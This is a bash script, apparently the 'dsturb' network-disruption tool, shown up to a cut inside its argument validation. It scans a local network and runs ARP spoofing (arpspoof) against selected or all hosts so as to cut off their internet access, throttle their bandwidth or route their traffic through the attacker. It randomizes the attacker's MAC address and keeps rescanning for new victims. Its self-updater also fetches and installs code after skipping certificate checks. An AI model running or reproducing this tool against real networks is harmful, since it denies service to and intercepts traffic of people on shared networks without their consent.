#!/bin/bash

#
#   Author: R7FX    (github.com/avivbintangaringga)
#           MrSyhd  (github.com/syahidnurrohim)
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Required packages for script to run
REQUIREMENTS="arpspoof:dsniff macchanger tc:iproute dhclient:isc-dhcp-client ifconfig:net-tools nmap wget arp-scan netdiscover"

# Script version
VERSION=$(cat /usr/share/dsturb/version)

# Terminal colors ( stolen from fluxion ;) )

# Regular Text
readonly CRed="\e[0;31m"
readonly CGrn="\e[0;32m"
readonly CYel="\e[0;33m"
readonly CBlu="\e[0;34m"
readonly CPrp="\e[0;35m"
readonly CCyn="\e[0;36m"
readonly CGry="\e[0;37m"
readonly CWht="\e[0;37m"
readonly CClr="\e[0m"

# [S] - Strong text (bold)
readonly CSRed="\e[1;31m"
readonly CSGrn="\e[1;32m"
readonly CSYel="\e[1;33m"
readonly CSBlu="\e[1;34m"
readonly CSPrp="\e[1;35m"
readonly CSCyn="\e[1;36m"
readonly CSGry="\e[1;37m"
readonly CSWht="\e[1;37m"

# [D] - Dark text
readonly CDRed="\e[2;31m"
readonly CDGrn="\e[2;32m"
readonly CDYel="\e[2;33m"
readonly CDBlu="\e[2;34m"
readonly CDPrp="\e[2;35m"
readonly CDCyn="\e[2;36m"
readonly CDGry="\e[2;37m"
readonly CDWht="\e[2;37m"

# [I] Italicized text
readonly CIRed="\e[3;31m"
readonly CIGrn="\e[3;32m"
readonly CIYel="\e[3;33m"
readonly CIBlu="\e[3;34m"
readonly CIPrp="\e[3;35m"
readonly CICyn="\e[3;36m"
readonly CIGry="\e[3;37m"
readonly CIWht="\e[3;37m"

# [U] - Underlined text
readonly CURed="\e[4;31m"
readonly CUGrn="\e[4;32m"
readonly CUYel="\e[4;33m"
readonly CUBlu="\e[4;34m"
readonly CUPrp="\e[4;35m"
readonly CUCyn="\e[4;36m"
readonly CUGry="\e[4;37m"
readonly CUWht="\e[4;37m"

# [B] - Blinking text
readonly CBRed="\e[5;31m"
readonly CBGrn="\e[5;32m"
readonly CBYel="\e[5;33m"
readonly CBBlu="\e[5;34m"
readonly CBPrp="\e[5;35m"
readonly CBCyn="\e[5;36m"
readonly CBGry="\e[5;37m"
readonly CBWht="\e[5;37m"

printtitle()
{
    local COLS="$(tput cols)"
    local FIXED=$(echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' | wc -c)
    PREFIX=$((COLS/2-FIXED/2-4))
    local I=0
    while [[ $I -lt $PREFIX ]]; do echo -ne "${CGrn}-${CClr}"; let I++; done
    [[ ! -z $1 ]] && echo -ne "${CYel}|${CClr}   $1   ${CYel}|${CClr}" || echo -ne "${CGrn}--------${CClr}"
    I=0
    REMAINDER=$((COLS-PREFIX-FIXED-8))
    while [[ $I -lt $REMAINDER ]]; do echo -ne "${CGrn}-${CClr}"; let I++; done
    echo
}

# Check for updates
func_check_updates()
{
    echo -ne "${CGrn}[${CYel}*${CGrn}]${CYel} Checking for updates... ${CClr}"

    if ! wget -q --spider --no-check-certificate https://raw.githubusercontent.com
    then
        echo -e "${CRed}cannot check updates!${CClr}"
        return
    fi

    LATEST_VERSION=$(wget --no-check-certificate -qO - https://raw.githubusercontent.com/avivbintangaringga/dsturb/master/version)

    if [[ $VERSION != $LATEST_VERSION ]]
    then
        echo -e "${CGrn}update detected!${CYel} (Version: ${CGrn}$LATEST_VERSION${CYel})${CClr}"

        [[ -d /tmp/dsturb_updates ]] && rm -r /tmp/dsturb_updates

        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Downloading updates...${CClr}"
        git clone https://github.com/avivbintangaringga/dsturb /tmp/dsturb_updates -q

        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Installing updates...${CClr}"
        make install -sC /tmp/dsturb_updates

        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Updates done!${CClr}"
        echo -e ""
        echo -ne "${CYel}Do you want to relaunch now? [${CBGrn}Y${CYel}/${CRed}n${CYel}]: ${CYel}"
        read RELAUNCH_PROMPT

        case $RELAUNCH_PROMPT in
            n|N) exit ;;
            *) echo -e "\n${CGrn}[${CYel}*${CGrn}]${CYel} Relaunching...${CClr}\n" && dsturb "$@" && exit;;
        esac
    else
        echo -e "${CYel}no updates detected!${CClr}"
    fi
}

# Display help
func_help()
{
    echo -e ""
    echo -e " Usage: $0 <options> [interface]"
    echo -e " "
    echo -e " Options:"
    echo -e "         -c  --connect                     Enable internet access on target"
    echo -e "         -d  --disconnect                  Disable internet access on target"
    echo -e "         -r  --randomize                   Randomize interface's MAC Address"
	echo -e "         -s  --scanner   [scanner]         Host scanner: arp-scan (default), nmap, netdiscover"
    echo -e "         -e  --exclude   [IP,IP,IP,...]    Exclude the following IP Addresses"
    echo -e "         -L  --limit     [rate-limit]      Limit bandwith for target"
    echo -e "         -h  --help                        Display help"
    echo -e " "
    echo -e "     Supported rate limit units:"
    echo -e "         b   ->  bits per second"
    echo -e "         k   ->  kilobits per second"
    echo -e "         m   ->  megabits per second"
    echo -e "         g   ->  gigabits per second"
    echo -e "         t   ->  terabits per second"
    echo -e "         B   ->  Bytes per second"
    echo -e "         K   ->  Kilobytes per second"
    echo -e "         M   ->  Megabytes per second"
    echo -e "         G   ->  Gigabytes per second"
    echo -e "         T   ->  Terabytes per second"
    echo -e "         (default: b)"
    echo -e " "
    echo -e "         e.g: 10K, 500K, 1M, 10M"
    echo -e ""
}

# Display header
func_header()
{
    clear
    printtitle ""
    printtitle ""
    printtitle "       ${CGrn}/${CSYel}##             ${CGrn}/${CSYel}##                         ${CGrn}/${CSYel}##      "
    printtitle "      ${CGrn}| ${CSYel}##            ${CGrn}| ${CSYel}##                        ${CGrn}| ${CSYel}##      "
    printtitle "  ${CGrn}/${CSYel}#######  ${CGrn}/${CSYel}######$ ${CGrn}/${CSYel}######   ${CGrn}/${CSYel}##   ${CGrn}/${CSYel}##  ${CGrn}/${CSYel}###### ${CGrn}| ${CSYel}######$ "
    printtitle " ${CGrn}/${CSYel}##${CGrn}__  ${CSYel}## ${CGrn}/${CSYel}##${CGrn}_____/|_  ${CSYel}##${CGrn}_/  | ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}/${CSYel}##${CGrn}__  ${CSYel}##${CGrn}| ${CSYel}##${CGrn}__  ${CSYel}##"
    printtitle "${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##${CGrn}|  ${CSYel}######   ${CGrn}| ${CSYel}##    ${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##${CGrn}| ${CSYel}##  ${CGrn}\__/| ${CSYel}##  ${CGrn}\ ${CSYel}##"
    printtitle "${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}\____  ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}/${CSYel}##${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##${CGrn}| ${CSYel}##      ${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##"
    printtitle "${CGrn}|  ${CSYel}####### ${CGrn}/${CSYel}#######${CGrn}/  |  ${CSYel}####${CGrn}/|  ${CSYel}######${CGrn}/| ${CSYel}##      ${CGrn}| ${CSYel}#######${CGrn}/"
    printtitle " ${CGrn}\_______/|_______/    \___/   \______/ |__/      |_______/ ${CClr}"
    printtitle "                                                            "
    printtitle "${CYel}Author: ${CUBlu}R7FX${CYel}, ${CUBlu}MrSyhd${CClr}                         ${CYel}version${CRed} $VERSION${CClr}"
    printtitle ""
    printtitle ""
    echo
}

# Validate IP Address
func_check_ip()
{
    # Initiate local IP variable
    local IP=$1

    # Initiate the result to be false (1)
    local RESULT=1

    # Check through every IP Address bytes if it is a number or not
    if [[ $IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
        # Split every bytes to an array
        IP=($(echo $IP | tr '.' '\n'))

        # Check every bytes value is in correct format (less than 255) and assign the result to the RESULT variable
        [[ ${IP[0]} -le 255 && ${IP[1]} -le 255 && ${IP[2]} -le 255 && ${IP[3]} -le 255 ]]
        RESULT=$?
    fi

    # Return the result
    return $RESULT
}

# Check limit rate format
func_check_rate_limit()
{
    local LIMIT=$(echo $RATE_LIMIT | tr -dC '[:alnum:]' | tr -d '[:alpha:]')
    local UNIT=$(echo $RATE_LIMIT | tr -dC '[:alnum:]' | tr -d '[:digit:]')

    # No number is given, return false
    [[ -z $LIMIT ]] && return 1

    case $UNIT in
        b) RATE_LIMIT="${LIMIT}bit";;
        k) RATE_LIMIT="${LIMIT}kbit";;
        m) RATE_LIMIT="${LIMIT}mbit";;
        g) RATE_LIMIT="${LIMIT}gbit";;
        t) RATE_LIMIT="${LIMIT}tbit";;
        B) RATE_LIMIT="${LIMIT}bps";;
        K) RATE_LIMIT="${LIMIT}kbps";;
        M) RATE_LIMIT="${LIMIT}mbps";;
        G) RATE_LIMIT="${LIMIT}gbps";;
        T) RATE_LIMIT="${LIMIT}tbps";;
        *) RATE_LIMIT="${LIMIT}bit";;
    esac

    # All is good
    return 0
}

# Checking package requirements
func_check_prerequires()
{
    # Assume all packages is installed
    NOT_INSTALLED=false

    # Loop through each required packages
	for REQ in $REQUIREMENTS
	do
        # Check if requirements is installed with 'hash' command 
        # Exit code should be 0 if it is installed and 1 if it isn't
        COMMAND=$(echo $REQ | cut -d ':' -f1)
        PACKAGE=$(echo $REQ | cut -d ':' -f2)
        if ! hash $COMMAND 2>/dev/null
        then
            # Display error message
            echo -ne "${CGrn}[${CBRed}!${CGrn}]${CYel} ${CRed}$PACKAGE${CClr}"
            [[ "$COMMAND" != "$PACKAGE" ]] && echo -ne "${CYel} (Package: ${CRed}$PACKAGE${CYel})${CClr}"
            echo -e "${CYel} is not installed!${CClr}"
            # Add package not installed flag
            PACKAGES_NOT_INSTALLED="$PACKAGES_NOT_INSTALLED $PACKAGE"
            NOT_INSTALLED=true
        fi
    done

    # Exit if any of the requirements isn't installed
    if [[ $NOT_INSTALLED == true ]]
    then
        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Run '${CSGrn}apt-get install$PACKAGES_NOT_INSTALLED${CYel}' or similiar depending on your distro.${CClr}"
        exit 1
    fi
}

# Do some cleanup
func_cleanup()
{
    echo -e "\n${CGrn}[${CYel}*${CGrn}]${CYel} Please wait for the cleanup process to be finished...${CClr}\n"

    # Get all child process PIDs (arpspoof)
    local PIDS=$(jobs -pr)

    # Kill all child process
    [[ ! -z $PIDS ]] && kill $PIDS

    # Wait for all child background process to fully finish
    wait

    # Remove rate limitting
    tc qdisc del dev $INTERFACE root > /dev/null 2>&1

    # Restore to original MAC Address if MAC Randomization enabled
    [[ ! -z $RANDOMIZE_MAC ]] && if $RANDOMIZE_MAC
    then

        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Restoring to original MAC Address....${CClr}\n"

        # Turn interface down
        ifconfig $INTERFACE down > /dev/null 2>&1

        # Turn back to original MAC Address
        macchanger -p $INTERFACE > /dev/null 2>&1

        # Turn interface back up
        ifconfig $INTERFACE up > /dev/null 2>&1 

        # Requesting new IP Address
        dhclient $INTERFACE > /dev/null 2>&1 
    fi

    echo -ne "${CClr}" 

    tput cnorm

    # Restore terminal screen
    tput rmcup

    # Finally exit
    exit 0
}

# Randomize MAC Address
func_randomize_mac()
{
    func_header

    echo -e "${CGrn}[${CYel}*${CGrn}]${CBYel} WARNING!:${CYel} Sometimes MAC Randomization is not working or buggy."
    echo -e "              You can always randomize by yourself before starting this script."
    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Randomizing MAC Address of interface \"${CGrn}$INTERFACE${CYel}\"${CClr}"

    # Turn interface down
    ifconfig $INTERFACE down > /dev/null 2>&1

    # Randomize MAC Address
    macchanger -r $INTERFACE > /dev/null 2>&1

    # Turn interface back up
    ifconfig $INTERFACE up > /dev/null 2>&1

    # Get new MAC Address
    read NEW_MAC </sys/class/net/$INTERFACE/address

    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} New MAC Address: ${CGrn}$NEW_MAC${CClr}"
    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Waiting until connected to a network...${CClr}"

    # Request new IP Address to DHCP Server
    dhclient $INTERFACE > /dev/null 2>&1
}

func_add_rate_limit_target()
{
    local IP=$1
    tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip dst $IP/32 flowid 1:1
    tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip src $IP/32 flowid 1:2
}

# Start rate limitting
func_rate_limit()
{
    # Add limitting rule
    tc qdisc add dev $INTERFACE root handle 1: htb default 30
    tc class add dev $INTERFACE parent 1: classid 1:1 htb rate $RATE_LIMIT
    tc class add dev $INTERFACE parent 1: classid 1:2 htb rate $RATE_LIMIT

    # Apply for all target IP
    for IP in $TARGET_IP
    do
        func_add_rate_limit_target $IP
    done
}

# Scan network
func_scan_network()
{
    func_header
	
	# Print host length warning
	[[ $CIDR -lt 22 ]] && echo -e "${CGrn}[${CBRed}!${CGrn}]${CYel} Large network detected, this scan may take minutes or hours${CClr}"

    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Host scanner: ${CGrn}$HOST_SCANNER${CYel}...${CClr}"
    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Scanning network ${CGrn}$NETWORK${CYel}...${CClr}"

    # Scan all available IP Address in then network
    case $HOST_SCANNER in
        nmap)           SCAN_RESULT=$(nmap -sn $NETWORK | grep "for" | cut -d ' ' -f 5-);;
        arp-scan)       SCAN_RESULT=$(arp-scan -g -N -r 1 -l -I $INTERFACE | grep -A 99999999 "Starting" | awk '/.*:.*:.*:.*:.*:.*/{print $1}');;
        netdiscover)    SCAN_RESULT=$(netdiscover -Pi $INTERFACE -r $NETWORK | awk '/.*:.*:.*:.*:.*:.*/{print $1}');;
    esac

    # Exclude gateway IP and your own IP from the list
    for IP in $(echo "$GATEWAY $MY_IP")
    do
        SCAN_RESULT=$(echo "$SCAN_RESULT" | grep -vw "$IP")
    done

    # Iterate through the scan result
    local INDEX=1
    while read -r IP_AND_HOSTNAME
    do
        # Get IP Address
        IP=$(echo $IP_AND_HOSTNAME | cut -d '(' -f2 | cut -d ')' -f1)

        # Get Hostname
        HOSTNAME=$(echo $IP_AND_HOSTNAME | cut -d ' ' -f1)

        # Assign scanned host with hostname if available
        [[ $IP == $HOSTNAME ]] && HOSTS[$INDEX]=$(printf "%s\n" $IP) || HOSTS[$INDEX]=$(printf "%-20s (%s)\n" $IP $HOSTNAME)
        let 'INDEX++'
    done < <(echo "$SCAN_RESULT")

    # No IP address on the network, prompting to rescan
    if [[ -z $SCAN_RESULT ]]
    then
        echo -e "${CGrn}[${CBRed}!${CGrn}]${CYel} No IP Address is detected on the network! Rescanning in 3 seconds... ${CClr}"
        sleep 3
        func_scan_network
    fi
}

# Start the attack :)
func_start_attack()
{
    tput civis

    func_header

    # No rate limit specified
    [[ -z $RATE_LIMIT ]] && RATE_LIMIT="Unlimited"

    echo -e " ${CYel}+${CCLr}"
    echo -e " ${CGrn}|${CYel} Target Network      ${CGrn}: ${CYel}$NETWORK${CClr}"
    echo -ne " ${CGrn}|${CYel} Bandwidth Limit     ${CGrn}: ${CYel}"
    [[ $FORWARD_TRAFFIC == true ]] && echo -e "$RATE_LIMIT${CClr}" || echo -e "${CBRed}Internet access blocked!${CClr}"
    echo -e " ${CGrn}|${CYel} Excluded IP Address ${CGrn}: ${CYel}$EXCLUDED_IP${CClr}"
    echo -e " ${CYel}+${CClr}"
    echo -e ""

    # Start the ARP Spoofing and print the output
    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Log:${CClr}\n"

    for IP in $TARGET_IP
    do
        echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Spoofing target: ${CGrn}$IP${CClr}"
        arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
    done
 
    # Block or forward internet access
    if [[ $FORWARD_TRAFFIC == true ]]
    then
        echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}] ${CGrn}Forwarding internet access...${CClr}"
        # Enabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=1

        if [[ "$RATE_LIMIT" != "Unlimited" ]]
        then
            echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}] ${CYel}Limitting target's traffic to ${CGrn}${RATE_LIMIT}${CYel}...${CClr}"
            func_rate_limit
        fi
    else
        echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}] ${CRed}Blocking internet access...${CClr}"
        # Disabling IP Forwarding
        sysctl -q net.ipv4.ip_forward=0
    fi

    RESCANNING_DELAY=60

    echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Using host scanner: ${CGrn}$HOST_SCANNER${CClr}"
    echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Rescanning targets every ${CGrn}$RESCANNING_DELAY${CYel} seconds${CClr}"
    echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CGrn} Attack is running! ${CYel}Press ${CGrn}CTRL+C${CYel} to stop${CClr}"

    # Loop and discover new targets
    while true
    do
        sleep $RESCANNING_DELAY  # Nmap scan can interfere with arpspoof, so don't do it too often

        case $HOST_SCANNER in
            nmap)           NEW_SCAN=$(nmap -sn $NETWORK --disable-arp-ping | grep "for" | cut -d ' ' -f 5-);;
            arp-scan)       NEW_SCAN=$(arp-scan -g -N -r 1 -l -I $INTERFACE | grep -A 99999999 "Starting" | awk '/.*:.*:.*:.*:.*:.*/{print $1}');;
            netdiscover)    NEW_SCAN=$(netdiscover -Pi $INTERFACE -r $NETWORK | awk '/.*:.*:.*:.*:.*:.*/{print $1}');;
        esac

        while read -r RESULT
        do
            IP=$(echo $RESULT | cut -d '(' -f2 | cut -d ')' -f1)

            if echo "$EXCLUDED_IP $GATEWAY" | grep -qw "$IP"; then continue; fi

            if ! echo $TARGET_IP | grep -qw "$IP"
            then
                echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Found new target: ${CGrn}$IP${CClr}"
                arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
                [[ $FORWARD_TRAFFIC == true && $RATE_LIMIT != "Unlimited" ]] && func_add_rate_limit_target $IP
                TARGET_IP="$TARGET_IP $IP"
            fi
        done < <(echo "$NEW_SCAN")
    done
}

start_interactive_mode()
{
    # Open new terminal screen
    tput smcup

    # Trap func_cleanup so that it will be called if CTRL+C is fired or when script is killed
    trap func_cleanup SIGINT SIGTERM SIGKILL

    while true
    do
        # Print header
        func_header
        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select Network Interface:${CClr}\n"

        # Iterate all interface that connected to a network
        local INDEX=1
        while read -r IFACE
        do
            # Print it
            printf " ${CGrn}%2s${CYel})  %-16s %s\n" $INDEX $IFACE

            # Assign the interface to an array
            IFACE_LIST[$INDEX]=$IFACE
            let 'INDEX++'
        done < <(ip -o -f inet addr show | awk '/scope global/ {printf "%20s (%s)\n",$2,$4}')

        # If no interface is connected to a network, then prompt to rescan
        if [[ -z ${IFACE_LIST[@]} ]]
        then
            echo -ne "${CGrn}[${CBRed}!${CGrn}]${CYel} No interface is currently connected to any network! Scan again? [${CBGrn}Y${CYel}/${CRed}n${CYel}]: ${CYel}"
            read -n1 SCAN_AGAIN

            case $SCAN_AGAIN in
                N|n) func_cleanup ;;
                *) func_select_interface ;;
            esac
        fi

        # When interface list is only 1, it will be selected as default so you don't have to choose
        [[ ${#IFACE_LIST[@]} == 1 ]] && SELECTED_IFACE=${IFACE_LIST[1]} && break

        echo -ne "\n${CGrn}[${CYel}Select${CGrn}]${CYel}: "
        [[ ${#IFACE_LIST[@]} -lt 10 ]] && read -n1 SELECT || read SELECT

        SELECTED_IFACE=${IFACE_LIST[$SELECT]}

        if [[ -z $SELECTED_IFACE ]]
        then
            [[ ${#IFACE_LIST[@]} -lt 10 ]] && echo
            echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CYel} Invalid input!${CClr}"
            sleep 2
        else 
            break
        fi
    done

    # Selected interface
    INTERFACE=$(echo $SELECTED_IFACE | cut -d ' ' -f1)

    # Selected network
    NETWORK=$(echo $SELECTED_IFACE | cut -d '(' -f2 | cut -d ')' -f1)

    # Prompt MAC Address randomization
    while true
    do
        func_header

        echo -e "${CGrn}[${CYel}?${CGrn}]${CYel} Do you want to randomize ${CGrn}$INTERFACE${CYel} MAC Address?\n"
        echo -e "    ${CGrn}1${CYel}) Yes"
        echo -e "    ${CGrn}2${CYel}) No (${CGrn}default${CYel})"
        echo -ne "\n${CGrn}[${CYel}Select${CGrn}]${CYel}: "
        read -n1 RANDOMIZE_MAC_PROMPT

        case $RANDOMIZE_MAC_PROMPT in
            1) RANDOMIZE_MAC=true
               func_randomize_mac
               # Get new address after randomizing, in case it is different
               NETWORK=$(ip -o -f inet addr show $INTERFACE 2>&1 | awk '/scope global/ {printf "%s\n",$4}')
               break ;;
            2) break ;;
            *) [[ -z $RANDOMIZE_MAC_PROMPT ]] && break; echo -e "\n\n${CGrn}[${CBRed}!${CGrn}]${CYel} Invalid input!${CClr}"; sleep 2 ;;
        esac
    done

    # Get your IP Addresses and add to exclusion list
    MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ' ')
    EXCLUDED_IP=$(echo "$MY_IP $EXCLUDED_IP" | tr ',' ' ')

    # Get gateway IP of interface
    GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")
	
	# Store CIDR from the given gateway
	CIDR=$(echo $NETWORK | cut -d "/" -f2)

    # Just turn to <gateway>/<cidr> format, not really important
	NETWORK="$GATEWAY/$CIDR"

    # Select Host Discovery method
    while true
    do
        func_header

        echo -e "${CGrn}[${CYel}?${CGrn}]${CYel} Select host scanner:\n"
        echo -e "    ${CGrn}1${CYel}) Arp-scan      (${CGrn}fastest${CYel}) ${CGrn}(${CYel}default${CGrn})"
		echo -e "    ${CGrn}2${CYel}) Nmap          (${CGrn}most reliable${CYel}) (${CRed}slow on large network${CYel})"
        echo -e "    ${CGrn}3${CYel}) Netdiscover   (${CGrn}slightly faster${CYel})"
        echo -ne "\n${CGrn}[${CYel}Select${CGrn}]${CYel}: "
        read -n1 HOST_SCANNER_PROMPT

        case $HOST_SCANNER_PROMPT in
            1) HOST_SCANNER=arp-scan; break ;;
            2) HOST_SCANNER=nmap; break ;;
            3) HOST_SCANNER=netdiscover; break ;;
            *) [[ -z $HOST_SCANNER_PROMPT ]] && HOST_SCANNER=arp-scan && break; echo -e "\n\n${CGrn}[${CBRed}!${CGrn}]${CYel} Invalid input!${CClr}"; sleep 2 ;;
        esac
    done

    # Scan the network
    func_scan_network

    # Print header
    func_header

    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select Target:\n"

    # Iterate all hosts found
    INDEX=1
    while [[ $INDEX -le ${#HOSTS[@]} ]]
    do
        # Print it
        printf " ${CGrn}%3s${CYel})  %s\n" $INDEX "${HOSTS[$INDEX]}"

        # Assign the IP to an array
        IP_LIST[$INDEX]=$(echo "${HOSTS[$INDEX]}" | cut -d ' ' -f1)
        let 'INDEX++'
    done

    echo -e "   ${CGrn}*${CYel})  All Addresses${CClr}\n"
    echo -ne "${CGrn}[${CYel}Select${CGrn}]${CYel}: "
    read SELECT_IP

    # If all address is selected
    if [[ ($SELECT_IP == "*" || -z $SELECT_IP) ]]
    then
        TARGET_IP="${IP_LIST[@]}"

        # If target is more than 1, then prompt to exclude IP
        if [[ ${#IP_LIST[@]} -gt 1 ]]
        then
            while true
            do
                # Print header
                func_header

                # Prompt to exclude IP
                echo -e "${CGrn}[${CYel}?${CGrn}]${CYel} Do you want to exclude IP Addresses?\n"
                echo -e "    ${CGrn}1${CYel}) Yes"
                echo -e "    ${CGrn}2${CYel}) No (${CGrn}default${CYel})"
                echo -ne "\n${CGrn}[${CYel}Select${CGrn}]${CYel}: "
                read -n1 EXCLUDE_PROMPT

                case $EXCLUDE_PROMPT in
                    1|2) break ;;
                    *) [[ -z $EXCLUDE_PROMPT ]] && break; echo -e "\n\n${CGrn}[${CBRed}!${CGrn}]${CYel} Invalid input!${CClr}"; sleep 2 ;;
                esac
            done

            if [[ $EXCLUDE_PROMPT == 1 ]]
            then
                func_header

                echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select IP Addresses you want to exclude:\n"

                local INDEX2=1
                while [[ $INDEX2 -le ${#HOSTS[@]} ]]
                do
                    printf " ${CGrn}%3s${CYel})  %s\n" $INDEX2 "${HOSTS[$INDEX2]}"
                    let 'INDEX2++'
                done

                echo -ne "\n${CGrn}[${CYel}Select${CGrn}]${CYel}: "
                read SELECT_EXCLUDE_IP

                # Remove excluded IP from target list
                for SELECTED in $(echo $SELECT_EXCLUDE_IP | tr ',' ' ')
                do
                    [[ $SELECTED -lt $INDEX2 ]] && TARGET_IP=$(echo $TARGET_IP | sed "s/\<${IP_LIST[$SELECTED]}\>//g")
                    EXCLUDED_IP="$EXCLUDED_UP ${IP_LIST[$SELECTED]}"
                done
    
                EXCLUDED_IP=$(echo $EXCLUDED_IP | tr -s ' ')
            fi
        fi
    else
        # Assign selected IP to target list
        for SELECTED in $(echo $SELECT_IP | tr ',' ' ')
        do
            [[ $SELECTED -lt $INDEX ]] && TARGET_IP="$TARGET_IP ${IP_LIST[$SELECTED]}"
        done
    fi

    # Prompt traffic mode
    func_header

    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select Traffic Mode:\n"
    echo -e "   ${CGrn}1${CYel}) Block Internet Access (${CGrn}default${CYel})"
    echo -e "   ${CGrn}2${CYel}) Limit Bandwidth"
    echo -e "   ${CGrn}3${CYel}) Forward Traffic"

    echo -ne "\n${CGrn}[${CYel}Select${CGrn}]${CYel}: "
    read -n1 FORWARD_PROMPT

    case $FORWARD_PROMPT in
        2) FORWARD_TRAFFIC=true ; LIMIT_TRAFFIC=true ;;
        3) FORWARD_TRAFFIC=true ; LIMIT_TRAFFIC=false ;;
        *) FORWARD_TRAFFIC=false ;;
    esac

    # Prompt for bandwidth rate limitting if internet access is given
    if $FORWARD_TRAFFIC && $LIMIT_TRAFFIC
    then
        func_header
        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Enter bandwidth rate limit for targets:"
        echo -e "    Supported Units: b, k, m, g, t, B, K, M, G, T  (default: b)"
        echo -e "    Leave empty to make unlimited rate"
        echo -e "    (e.g.: 500K)\n${CClr}"
        echo -ne "${CGrn}[${CYel}Limit${CGrn}]${CYel}: "
        read RATE_LIMIT

        # Loop until correct format is inputted, and then start the limitting
        [[ ! -z $RATE_LIMIT ]] && while ! func_check_rate_limit
        do
            echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CRed} Invalid input!${CClr}\n"
            echo -ne "${CGrn}[${CYel}Limit${CGrn}]${CYel}: "
            read RATE_LIMIT
        done
    fi

    # Finally START THE ATTACK!!!
    func_start_attack
}

# Arpspoof is requiring root access
if [[ $EUID -ne 0 ]] 
then 
    sudo "$0" "$@"
    exit $?
fi

# Call function to check package requirements
func_check_prerequires

# Check network connection
#if ! ping -q -w 1 -c 1 `ip r | grep default | cut -d ' ' -f 3` > /dev/null 2>&1
#then
#    echo -e "\n[!] Please check your network connection!\n"
#    exit 1
#fi

echo -e "\n${CSGrn}dsturb${CYel} version ${CRed}$VERSION${CClr}\n"

func_check_updates

echo -e ""

# If no argument is given, then run interactive mode
[[ -z $1 ]] && start_interactive_mode

# Get all options
OPTIONS=$(getopt -l "help,connect,disconnect,randomize,scanner:,exclude:,limit:" -o "hcdrs:e:L:" -a -- "$@")
eval set -- "$OPTIONS"

# Loop each options and add a flag
while true
do
    case $1 in
        -c|--connect) FORWARD_TRAFFIC=true ;;
        -d|--disconnect) FORWARD_TRAFFIC=false ;;
        -s|--scanner)  shift; [[ -z $1 ]] && func_help && exit 1; HOST_SCANNER=$1;;
        -r|--randomize) RANDOMIZE_MAC=true ;;
        -e|--exclude) shift; [[ -z $1 ]] && func_help && exit 1; EXCLUDED_IP=$1;;
        -L|--limit) shift; [[ -z $1 ]] && func_help && exit 1; RATE_LIMIT=$1;;
        -h|--help) func_help && exit 0 ;;
        --) shift; [[ -z $1 ]] && func_help && exit 1; INTERFACE=$1; break;;
    esac
    shift
done

# Default values
[[ -z $FORWARD_TRAFFIC ]] && FORWARD_TRAFFIC=true
[[ -z $RANDOMIZE_MAC ]] && RANDOMIZE_MAC=false
[[ -z $HOST_SCANNER ]] && HOST_SCANNER=arp-scan

# Check for interface availability
[[ ! -d /sys/class/net/$INTERFACE ]] && echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CYel} Interface \"${CRed}$INTERFACE${CYel}\" doesn't exist!${CClr}\n" && exit 1

# Check rate limit format
[[ ! -z $RATE_LIMIT ]] && if ! func_check_rate_limit
then
    echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CYel}Invalid rate limit!${CClr}\n"
    func_help
    exit 1
fi

[[ $HOST_SCANNER != nmap && $HOST_SCANNER != arp-scan && $HOST_SCANNER != netdiscover ]] && func_help && exit 1

# Loop through all IP Addresses to validate IP Address format
[[ ! -z $EXCLUDED_IP ]] && EXCLUDED_IP=$(echo "$EXCLUDED_IP" | tr ',' ' ') && for IP in "$EXCLUDED_IP"
do
    # Call the function to validate IP Address
    if ! func_check_ip $IP
    then
